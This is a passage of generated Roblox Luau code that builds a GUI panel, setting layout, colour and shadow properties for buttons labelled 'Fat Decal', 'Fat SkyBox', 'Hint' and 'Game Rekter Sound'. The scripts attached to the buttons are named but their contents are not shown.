--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder.penumbraShadow
G2L["329"].Name = [[penumbraShadow]]
G2L["329"].Image = [[rbxassetid://1316045217]]
G2L["329"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["329"].ScaleType = Enum.ScaleType.Slice
G2L["329"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["329"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["329"].Active = false
G2L["329"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["329"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["329"].BackgroundTransparency = 1
G2L["329"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["329"].BorderSizePixel = 1
G2L["329"].ClipsDescendants = false
G2L["329"].Draggable = false
G2L["329"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["329"].Rotation = 0
G2L["329"].Selectable = false
G2L["329"].SelectionOrder = 0
G2L["329"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["329"].Visible = true
G2L["329"].ZIndex = 1
G2L["329"].Parent = G2L["327"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.shadowHolder.ambientShadow
G2L["330"].Name = [[ambientShadow]]
G2L["330"].Image = [[rbxassetid://1316045217]]
G2L["330"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["330"].ScaleType = Enum.ScaleType.Slice
G2L["330"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["330"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["330"].Active = false
G2L["330"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["330"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["330"].BackgroundTransparency = 1
G2L["330"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["330"].BorderSizePixel = 1
G2L["330"].ClipsDescendants = false
G2L["330"].Draggable = false
G2L["330"].Position = UDim2.new(0.5157791, 0, 0.42366832, 8)
G2L["330"].Rotation = 0
G2L["330"].Selectable = false
G2L["330"].SelectionOrder = 0
G2L["330"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["330"].Visible = true
G2L["330"].ZIndex = 1
G2L["330"].Parent = G2L["327"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.RemoteEvent
G2L["331"].Name = [[RemoteEvent]]
G2L["331"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.Script
G2L["332"].Name = [[Script]]
G2L["332"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Pink Guns.LocalScript
G2L["333"].Name = [[LocalScript]]
G2L["333"].Parent = G2L["322"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal
G2L["334"].Name = [[Fat Decal]]
G2L["334"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["334"].Text = [[Fat Decal]]
G2L["334"].TextColor3 = Color3.fromRGB(255, 240, 240)
G2L["334"].TextScaled = true
G2L["334"].TextSize = 14
G2L["334"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["334"].TextStrokeTransparency = 1
G2L["334"].TextWrapped = true
G2L["334"].TextXAlignment = Enum.TextXAlignment.Center
G2L["334"].TextYAlignment = Enum.TextYAlignment.Center
G2L["334"].Active = true
G2L["334"].AnchorPoint = Vector2.new(0, 0)
G2L["334"].BackgroundColor3 = Color3.fromRGB(200, 0, 255)
G2L["334"].BackgroundTransparency = 0.5
G2L["334"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["334"].BorderSizePixel = 0
G2L["334"].ClipsDescendants = false
G2L["334"].Draggable = false
G2L["334"].Position = UDim2.new(0, 0, 0, 0)
G2L["334"].Rotation = 0
G2L["334"].Selectable = true
G2L["334"].SelectionOrder = 0
G2L["334"].Size = UDim2.new(0, 200, 0, 50)
G2L["334"].Visible = true
G2L["334"].ZIndex = 1
G2L["334"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.UICorner
G2L["335"].Name = [[UICorner]]
G2L["335"].CornerRadius = UDim.new(0, 8)
G2L["335"].Parent = G2L["334"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder
G2L["336"].Name = [[shadowHolder]]
G2L["336"].Active = false
G2L["336"].AnchorPoint = Vector2.new(0, 0)
G2L["336"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["336"].BackgroundTransparency = 1
G2L["336"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["336"].BorderSizePixel = 1
G2L["336"].ClipsDescendants = false
G2L["336"].Draggable = false
G2L["336"].Position = UDim2.new(0, 0, 0, 0)
G2L["336"].Rotation = 0
G2L["336"].Selectable = false
G2L["336"].SelectionOrder = 0
G2L["336"].Size = UDim2.new(1, 0, 1, 0)
G2L["336"].Visible = true
G2L["336"].ZIndex = -1
G2L["336"].Parent = G2L["334"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder.umbraShadow
G2L["337"].Name = [[umbraShadow]]
G2L["337"].Image = [[rbxassetid://1316045217]]
G2L["337"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["337"].ScaleType = Enum.ScaleType.Slice
G2L["337"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["337"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["337"].Active = false
G2L["337"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["337"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["337"].BackgroundTransparency = 1
G2L["337"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["337"].BorderSizePixel = 1
G2L["337"].ClipsDescendants = false
G2L["337"].Draggable = false
G2L["337"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["337"].Rotation = 0
G2L["337"].Selectable = false
G2L["337"].SelectionOrder = 0
G2L["337"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["337"].Visible = true
G2L["337"].ZIndex = 1
G2L["337"].Parent = G2L["336"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder.penumbraShadow
G2L["338"].Name = [[penumbraShadow]]
G2L["338"].Image = [[rbxassetid://1316045217]]
G2L["338"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["338"].ScaleType = Enum.ScaleType.Slice
G2L["338"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["338"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["338"].Active = false
G2L["338"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["338"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["338"].BackgroundTransparency = 1
G2L["338"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["338"].BorderSizePixel = 1
G2L["338"].ClipsDescendants = false
G2L["338"].Draggable = false
G2L["338"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["338"].Rotation = 0
G2L["338"].Selectable = false
G2L["338"].SelectionOrder = 0
G2L["338"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["338"].Visible = true
G2L["338"].ZIndex = 1
G2L["338"].Parent = G2L["336"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.shadowHolder.ambientShadow
G2L["339"].Name = [[ambientShadow]]
G2L["339"].Image = [[rbxassetid://1316045217]]
G2L["339"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["339"].ScaleType = Enum.ScaleType.Slice
G2L["339"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["339"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["339"].Active = false
G2L["339"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["339"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["339"].BackgroundTransparency = 1
G2L["339"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["339"].BorderSizePixel = 1
G2L["339"].ClipsDescendants = false
G2L["339"].Draggable = false
G2L["339"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["339"].Rotation = 0
G2L["339"].Selectable = false
G2L["339"].SelectionOrder = 0
G2L["339"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["339"].Visible = true
G2L["339"].ZIndex = 1
G2L["339"].Parent = G2L["336"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.TextButton_Roundify_12px
G2L["340"].Name = [[TextButton_Roundify_12px]]
G2L["340"].Image = [[rbxassetid://3570695787]]
G2L["340"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["340"].ScaleType = Enum.ScaleType.Slice
G2L["340"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["340"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["340"].Active = true
G2L["340"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["340"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["340"].BackgroundTransparency = 1
G2L["340"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["340"].BorderSizePixel = 1
G2L["340"].ClipsDescendants = false
G2L["340"].Draggable = false
G2L["340"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["340"].Rotation = 0
G2L["340"].Selectable = true
G2L["340"].SelectionOrder = 0
G2L["340"].Size = UDim2.new(1, 0, 1, 0)
G2L["340"].Visible = true
G2L["340"].ZIndex = 1
G2L["340"].Parent = G2L["334"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat Decal.Script
G2L["341"].Name = [[Script]]
G2L["341"].Parent = G2L["334"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox
G2L["342"].Name = [[Fat SkyBox]]
G2L["342"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["342"].Text = [[Fat SkyBox]]
G2L["342"].TextColor3 = Color3.fromRGB(255, 240, 240)
G2L["342"].TextScaled = true
G2L["342"].TextSize = 14
G2L["342"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["342"].TextStrokeTransparency = 1
G2L["342"].TextWrapped = true
G2L["342"].TextXAlignment = Enum.TextXAlignment.Center
G2L["342"].TextYAlignment = Enum.TextYAlignment.Center
G2L["342"].Active = true
G2L["342"].AnchorPoint = Vector2.new(0, 0)
G2L["342"].BackgroundColor3 = Color3.fromRGB(200, 0, 255)
G2L["342"].BackgroundTransparency = 0.5
G2L["342"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["342"].BorderSizePixel = 0
G2L["342"].ClipsDescendants = false
G2L["342"].Draggable = false
G2L["342"].Position = UDim2.new(0, 0, 0, 0)
G2L["342"].Rotation = 0
G2L["342"].Selectable = true
G2L["342"].SelectionOrder = 0
G2L["342"].Size = UDim2.new(0, 200, 0, 50)
G2L["342"].Visible = true
G2L["342"].ZIndex = 1
G2L["342"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.TextButton_Roundify_12px
G2L["343"].Name = [[TextButton_Roundify_12px]]
G2L["343"].Image = [[rbxassetid://3570695787]]
G2L["343"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["343"].ScaleType = Enum.ScaleType.Slice
G2L["343"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["343"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["343"].Active = true
G2L["343"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["343"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["343"].BackgroundTransparency = 1
G2L["343"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["343"].BorderSizePixel = 1
G2L["343"].ClipsDescendants = false
G2L["343"].Draggable = false
G2L["343"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["343"].Rotation = 0
G2L["343"].Selectable = true
G2L["343"].SelectionOrder = 0
G2L["343"].Size = UDim2.new(1, 0, 1, 0)
G2L["343"].Visible = true
G2L["343"].ZIndex = 1
G2L["343"].Parent = G2L["342"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.Script
G2L["344"].Name = [[Script]]
G2L["344"].Parent = G2L["342"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder
G2L["345"].Name = [[shadowHolder]]
G2L["345"].Active = false
G2L["345"].AnchorPoint = Vector2.new(0, 0)
G2L["345"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["345"].BackgroundTransparency = 1
G2L["345"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["345"].BorderSizePixel = 1
G2L["345"].ClipsDescendants = false
G2L["345"].Draggable = false
G2L["345"].Position = UDim2.new(0, 0, 0, 0)
G2L["345"].Rotation = 0
G2L["345"].Selectable = false
G2L["345"].SelectionOrder = 0
G2L["345"].Size = UDim2.new(1, 0, 1, 0)
G2L["345"].Visible = true
G2L["345"].ZIndex = -1
G2L["345"].Parent = G2L["342"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder.umbraShadow
G2L["346"].Name = [[umbraShadow]]
G2L["346"].Image = [[rbxassetid://1316045217]]
G2L["346"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["346"].ScaleType = Enum.ScaleType.Slice
G2L["346"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["346"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["346"].Active = false
G2L["346"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["346"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["346"].BackgroundTransparency = 1
G2L["346"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["346"].BorderSizePixel = 1
G2L["346"].ClipsDescendants = false
G2L["346"].Draggable = false
G2L["346"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["346"].Rotation = 0
G2L["346"].Selectable = false
G2L["346"].SelectionOrder = 0
G2L["346"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["346"].Visible = true
G2L["346"].ZIndex = 1
G2L["346"].Parent = G2L["345"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder.penumbraShadow
G2L["347"].Name = [[penumbraShadow]]
G2L["347"].Image = [[rbxassetid://1316045217]]
G2L["347"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["347"].ScaleType = Enum.ScaleType.Slice
G2L["347"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["347"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["347"].Active = false
G2L["347"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["347"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["347"].BackgroundTransparency = 1
G2L["347"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["347"].BorderSizePixel = 1
G2L["347"].ClipsDescendants = false
G2L["347"].Draggable = false
G2L["347"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["347"].Rotation = 0
G2L["347"].Selectable = false
G2L["347"].SelectionOrder = 0
G2L["347"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["347"].Visible = true
G2L["347"].ZIndex = 1
G2L["347"].Parent = G2L["345"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Fat SkyBox.shadowHolder.ambientShadow
G2L["348"].Name = [[ambientShadow]]
G2L["348"].Image = [[rbxassetid://1316045217]]
G2L["348"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["348"].ScaleType = Enum.ScaleType.Slice
G2L["348"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["348"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["348"].Active = false
G2L["348"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["348"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["348"].BackgroundTransparency = 1
G2L["348"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["348"].BorderSizePixel = 1
G2L["348"].ClipsDescendants = false
G2L["348"].Draggable = false
G2L["348"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["348"].Rotation = 0
G2L["348"].Selectable = false
G2L["348"].SelectionOrder = 0
G2L["348"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["348"].Visible = true
G2L["348"].ZIndex = 1
G2L["348"].Parent = G2L["345"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint
G2L["349"].Name = [[Hint]]
G2L["349"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["349"].Text = [[Hint]]
G2L["349"].TextColor3 = Color3.fromRGB(255, 240, 240)
G2L["349"].TextScaled = true
G2L["349"].TextSize = 14
G2L["349"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["349"].TextStrokeTransparency = 1
G2L["349"].TextWrapped = true
G2L["349"].TextXAlignment = Enum.TextXAlignment.Center
G2L["349"].TextYAlignment = Enum.TextYAlignment.Center
G2L["349"].Active = true
G2L["349"].AnchorPoint = Vector2.new(0, 0)
G2L["349"].BackgroundColor3 = Color3.fromRGB(200, 0, 255)
G2L["349"].BackgroundTransparency = 0.5
G2L["349"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["349"].BorderSizePixel = 0
G2L["349"].ClipsDescendants = false
G2L["349"].Draggable = false
G2L["349"].Position = UDim2.new(0, 0, 0, 0)
G2L["349"].Rotation = 0
G2L["349"].Selectable = true
G2L["349"].SelectionOrder = 0
G2L["349"].Size = UDim2.new(0, 200, 0, 50)
G2L["349"].Visible = true
G2L["349"].ZIndex = 1
G2L["349"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.TextButton_Roundify_12px
G2L["350"].Name = [[TextButton_Roundify_12px]]
G2L["350"].Image = [[rbxassetid://3570695787]]
G2L["350"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["350"].ScaleType = Enum.ScaleType.Slice
G2L["350"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["350"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["350"].Active = true
G2L["350"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["350"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["350"].BackgroundTransparency = 1
G2L["350"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["350"].BorderSizePixel = 1
G2L["350"].ClipsDescendants = false
G2L["350"].Draggable = false
G2L["350"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["350"].Rotation = 0
G2L["350"].Selectable = true
G2L["350"].SelectionOrder = 0
G2L["350"].Size = UDim2.new(1, 0, 1, 0)
G2L["350"].Visible = true
G2L["350"].ZIndex = 1
G2L["350"].Parent = G2L["349"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder
G2L["351"].Name = [[shadowHolder]]
G2L["351"].Active = false
G2L["351"].AnchorPoint = Vector2.new(0, 0)
G2L["351"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["351"].BackgroundTransparency = 1
G2L["351"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["351"].BorderSizePixel = 1
G2L["351"].ClipsDescendants = false
G2L["351"].Draggable = false
G2L["351"].Position = UDim2.new(0, 0, 0, 0)
G2L["351"].Rotation = 0
G2L["351"].Selectable = false
G2L["351"].SelectionOrder = 0
G2L["351"].Size = UDim2.new(1, 0, 1, 0)
G2L["351"].Visible = true
G2L["351"].ZIndex = -1
G2L["351"].Parent = G2L["349"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder.umbraShadow
G2L["352"].Name = [[umbraShadow]]
G2L["352"].Image = [[rbxassetid://1316045217]]
G2L["352"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["352"].ScaleType = Enum.ScaleType.Slice
G2L["352"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["352"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["352"].Active = false
G2L["352"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["352"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["352"].BackgroundTransparency = 1
G2L["352"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["352"].BorderSizePixel = 1
G2L["352"].ClipsDescendants = false
G2L["352"].Draggable = false
G2L["352"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["352"].Rotation = 0
G2L["352"].Selectable = false
G2L["352"].SelectionOrder = 0
G2L["352"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["352"].Visible = true
G2L["352"].ZIndex = 1
G2L["352"].Parent = G2L["351"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder.penumbraShadow
G2L["353"].Name = [[penumbraShadow]]
G2L["353"].Image = [[rbxassetid://1316045217]]
G2L["353"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["353"].ScaleType = Enum.ScaleType.Slice
G2L["353"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["353"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["353"].Active = false
G2L["353"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["353"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["353"].BackgroundTransparency = 1
G2L["353"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["353"].BorderSizePixel = 1
G2L["353"].ClipsDescendants = false
G2L["353"].Draggable = false
G2L["353"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["353"].Rotation = 0
G2L["353"].Selectable = false
G2L["353"].SelectionOrder = 0
G2L["353"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["353"].Visible = true
G2L["353"].ZIndex = 1
G2L["353"].Parent = G2L["351"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.shadowHolder.ambientShadow
G2L["354"].Name = [[ambientShadow]]
G2L["354"].Image = [[rbxassetid://1316045217]]
G2L["354"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["354"].ScaleType = Enum.ScaleType.Slice
G2L["354"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["354"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["354"].Active = false
G2L["354"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["354"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["354"].BackgroundTransparency = 1
G2L["354"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["354"].BorderSizePixel = 1
G2L["354"].ClipsDescendants = false
G2L["354"].Draggable = false
G2L["354"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["354"].Rotation = 0
G2L["354"].Selectable = false
G2L["354"].SelectionOrder = 0
G2L["354"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["354"].Visible = true
G2L["354"].ZIndex = 1
G2L["354"].Parent = G2L["351"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.UICorner
G2L["355"].Name = [[UICorner]]
G2L["355"].CornerRadius = UDim.new(0, 8)
G2L["355"].Parent = G2L["349"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Hint.Script
G2L["356"].Name = [[Script]]
G2L["356"].Parent = G2L["349"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound
G2L["357"].Name = [[Game Rekter Sound]]
G2L["357"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["357"].Text = [[Game Rekter Sound]]
G2L["357"].TextColor3 = Color3.fromRGB(255, 240, 240)
G2L["357"].TextScaled = true
G2L["357"].TextSize = 14
G2L["357"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["357"].TextStrokeTransparency = 1
G2L["357"].TextWrapped = true
G2L["357"].TextXAlignment = Enum.TextXAlignment.Center
G2L["357"].TextYAlignment = Enum.TextYAlignment.Center
G2L["357"].Active = true
G2L["357"].AnchorPoint = Vector2.new(0, 0)
G2L["357"].BackgroundColor3 = Color3.fromRGB(200, 0, 255)
G2L["357"].BackgroundTransparency = 0.5
G2L["357"].BorderColor3 = Color3.fromRGB(0, 0, 0)
G2L["357"].BorderSizePixel = 0
G2L["357"].ClipsDescendants = false
G2L["357"].Draggable = false
G2L["357"].Position = UDim2.new(0, 0, 0, 0)
G2L["357"].Rotation = 0
G2L["357"].Selectable = true
G2L["357"].SelectionOrder = 0
G2L["357"].Size = UDim2.new(0, 200, 0, 50)
G2L["357"].Visible = true
G2L["357"].ZIndex = 1
G2L["357"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.UICorner
G2L["358"].Name = [[UICorner]]
G2L["358"].CornerRadius = UDim.new(0, 8)
G2L["358"].Parent = G2L["357"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder
G2L["359"].Name = [[shadowHolder]]
G2L["359"].Active = false
G2L["359"].AnchorPoint = Vector2.new(0, 0)
G2L["359"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["359"].BackgroundTransparency = 1
G2L["359"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["359"].BorderSizePixel = 1
G2L["359"].ClipsDescendants = false
G2L["359"].Draggable = false
G2L["359"].Position = UDim2.new(0, 0, 0, 0)
G2L["359"].Rotation = 0
G2L["359"].Selectable = false
G2L["359"].SelectionOrder = 0
G2L["359"].Size = UDim2.new(1, 0, 1, 0)
G2L["359"].Visible = true
G2L["359"].ZIndex = -1
G2L["359"].Parent = G2L["357"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder.umbraShadow
G2L["360"].Name = [[umbraShadow]]
G2L["360"].Image = [[rbxassetid://1316045217]]
G2L["360"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["360"].ScaleType = Enum.ScaleType.Slice
G2L["360"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["360"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["360"].Active = false
G2L["360"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["360"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["360"].BackgroundTransparency = 1
G2L["360"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["360"].BorderSizePixel = 1
G2L["360"].ClipsDescendants = false
G2L["360"].Draggable = false
G2L["360"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["360"].Rotation = 0
G2L["360"].Selectable = false
G2L["360"].SelectionOrder = 0
G2L["360"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["360"].Visible = true
G2L["360"].ZIndex = 1
G2L["360"].Parent = G2L["359"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder.penumbraShadow
G2L["361"].Name = [[penumbraShadow]]
G2L["361"].Image = [[rbxassetid://1316045217]]
G2L["361"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["361"].ScaleType = Enum.ScaleType.Slice
G2L["361"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["361"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["361"].Active = false
G2L["361"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["361"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["361"].BackgroundTransparency = 1
G2L["361"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["361"].BorderSizePixel = 1
G2L["361"].ClipsDescendants = false
G2L["361"].Draggable = false
G2L["361"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["361"].Rotation = 0
G2L["361"].Selectable = false
G2L["361"].SelectionOrder = 0
G2L["361"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["361"].Visible = true
G2L["361"].ZIndex = 1
G2L["361"].Parent = G2L["359"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Game Rekter Sound.shadowHolder.ambientShadow
G2L["362"].Name = [[ambientShadow]]
G2L["362"].Image = [[rbxassetid://1316045217]]
G2L["362"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["362"].ScaleType = Enum.ScaleType.Slice
G2L["362"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["362"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["362"].Active = false
G2L["362"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["362"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["362"].BackgroundTransparency = 1
G2L["362"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["362"].BorderSizePixel = 1
G2L["362"].ClipsDescendants = false
G2L["362"].Draggable = false
G2L["362"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["362"].Rotation = 0
G2L["362"].Selectable = false
G2L["362"].SelectionOrder = 0
